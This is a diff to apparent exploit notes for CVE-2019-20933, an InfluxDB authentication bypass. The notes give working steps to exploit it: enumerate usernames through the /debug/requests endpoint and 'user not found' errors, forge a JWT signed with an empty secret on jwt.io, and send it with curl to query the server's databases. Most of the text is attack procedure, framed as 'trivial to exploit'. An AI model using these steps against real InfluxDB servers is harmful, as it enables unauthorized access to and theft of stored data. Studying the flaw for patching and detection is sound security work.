@@ -7,7 +7,9 @@ InfluxDB Documentation - Authenticate using jwt tokens
 https://docs.influxdata.com/influxdb/v1.7/administration/authentication_and_authorization/#authenticate-using-jwt-tokens
 
 
-* No idea why this didn't get a CVE
+* CVE-2019-20933
+InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go
+because a JWT token may have an empty SharedSecret (aka shared secret).
 
 
 Trivial to exploit:
@@ -18,16 +20,26 @@ Trivial to exploit:
 		curl http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES'
 		{"error":"unable to parse authentication credentials"}
 
-		curl http://<host>:<port>/query -u 'someuser:somepasswd' --data-urlencode 'q=SHOW DATABASES'
+		curl http://<host>:<port>/query -u 'bla:bla' --data-urlencode 'q=SHOW DATABASES'
 		{"error":"authorization failed"}
 
 	* Bypass Auth, Issue request with jwt token (no shared secret)
 
-		curl -s http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES' --header 'Authorization: Bearer <token>'
+		1: If enabled, Discover a user name's via the following URL: https://<influx-server-address>:<port>/debug/requests
 
-	* Enumerate users with no shared secret in jwt (user not found returned):
+		2: Create a valid JWT token with the user, an empty secret, and a valid expiry date
+		   https://jwt.io/
+			header    - {"alg": "HS256", "typ": "JWT"}
+			payload   - {"username":"<input user name here>","exp":<exp date in epoch>}
+			signature - HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),<leave this field empty>)
 
-		{"error":"user not found"}
+		3: Authenticate to the server using the HTTP header: Authorization: Bearer <The generated JWT token>
+
+			curl -s http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES' --header 'Authorization: Bearer <token>'
+
+	* Enumerate users with no shared secret jwt (user not found returned):
+
+			{"error":"user not found"}
 
 Quick hit usernames:
 -----------------------
